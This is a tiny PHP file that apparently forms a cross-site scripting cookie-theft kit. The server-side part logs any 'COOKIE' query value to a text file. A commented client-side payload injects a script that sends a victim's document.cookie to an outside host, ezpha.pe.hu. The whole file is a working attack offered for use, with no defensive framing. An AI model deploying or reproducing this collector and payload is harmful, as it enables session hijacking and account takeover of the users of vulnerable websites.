<?php

// #_# Server Side #_#

if (isset($_GET['COOKIE']) && !empty($_GET['COOKIE']))
{
  $cs=$_GET['COOKIE'];
  $ck = fopen('atome.txt','a');
  fputs($ck,$cs);
  fclose($ck);
  echo $cs;
}
?>

<!--

#_# Client Side #_#

#_#PAYLOAD#_#   <script>window.open("http://ezpha.pe.hu/XSS_1.php?COOKIE="+document.cookie);</script>

-->
